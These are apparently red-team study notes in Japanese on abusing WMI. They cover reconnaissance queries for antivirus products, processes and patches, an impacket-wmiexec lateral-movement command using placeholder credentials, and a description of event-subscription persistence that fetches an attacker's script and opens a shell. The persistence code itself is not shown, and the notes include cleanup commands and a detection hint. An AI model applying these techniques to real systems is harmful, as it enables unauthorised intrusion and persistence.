# WMIとは
Windows Management Instrumentationの略。Windowsシステムを統一的に管理、監視するための仕組み。

## Step1 偵察
```powershell
# セキュリティソフト検索
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
# 実行中プロセス
Get-CimInstance -ClassName Win32_Process | Select-Object Name, ExecutablePath, CommandLine | Format-Table -AutoSize
# パッチ状況
Get-CimInstance -ClassName Win32_QuickFixEngineering | Select-Object Caption, Description, HotFixID, InstalledOn
```
## Step2 横展開
```bash
# 認証情報を使用して別PCに対してコマンド実行
impacket-wmiexec user:password@10.10.10.2 "whoami"
```
## Step3 永続化
WMIのイベントサブスクリプションを悪用し、永続化を図る。  
Filter, Consumerの作成とその2つの紐づけが必要。 Filterはいつ実行するか。Consumerは何を実行するか。  
step3.ps1はターゲットがメモ帳を開くたびに攻撃者のWebサーバーからスクリプトをメモリ上で実行し、シェルを取る永続化を実現。  
ログとしてはWmiPrvSE.exeからpowershellという親子関係のため、不自然な形となる。
```powershell
# Consumer確認
Get-CimInstance -Namespace "root\subscription" -ClassName __EventConsumer
# Filter確認
Get-CimInstance -Namespace "root\subscription" -ClassName __EventFilter

$N = "root\subscription"
$targetName = "test"
# 特定のConsumerを削除
Get-CimInstance -Namespace $N -ClassName CommandLineEventConsumer -Filter "Name='$targetName'" | Remove-CimInstance
# 特定のFilterを削除
Get-CimInstance -Namespace $N -ClassName __EventFilter -Filter "Name='$targetName'" | Remove-CimInstance
```
